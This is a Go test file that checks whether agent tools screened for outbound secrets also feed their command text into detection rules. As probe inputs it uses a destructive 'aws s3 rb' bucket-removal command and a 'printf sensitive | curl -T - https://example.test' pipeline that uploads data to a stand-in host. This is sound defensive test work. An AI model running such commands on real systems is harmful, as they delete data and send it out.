package tools

import (
	"strings"
	"testing"

	"github.com/lycaon/lycaon/internal/detectionpack"
	"github.com/lycaon/lycaon/internal/toolcontract"
)

// Invariant: tools screened for outbound secrets match tools projecting commands into detection rules.
func TestScreenedCommandSurfacesReachDetectionRules(t *testing.T) {
	t.Parallel()
	const marker = "aws s3 rb s3://parity-probe"
	args := map[string]map[string]any{
		"command":       {"command": marker},
		"verify":        {"command": marker},
		"terminal_open": {"command": marker},
		"terminal_send": {"id": "t1", "input": marker + "{Enter}"},
	}
	screened := map[string]bool{}
	for _, tool := range toolcontract.SecretReferenceTools() {
		if _, ok := processArgumentSurface(catalogContract(t, tool)); ok {
			screened[tool] = true
		}
	}
	for tool := range screened {
		probe, ok := args[tool]
		if !ok {
			t.Errorf("%s is screened for secrets but this test does not know its command argument", tool)
			continue
		}
		if text := detectionpack.CommandTextForTool(tool, probe); !strings.Contains(text, marker) {
			t.Errorf("%s: detection projection got %q, want the command text", tool, text)
		}
	}
	for tool := range args {
		if !screened[tool] {
			t.Errorf("%s carries command text but is not screened for outbound secrets", tool)
		}
	}

	pipeline := map[string]any{"pipeline": []any{"printf sensitive", "curl -T - https://example.test"}}
	for _, tool := range []string{"command", "verify"} {
		if text := detectionpack.CommandTextForTool(tool, pipeline); text != "printf sensitive | curl -T - https://example.test" {
			t.Errorf("%s detection pipeline = %q", tool, text)
		}
	}
}
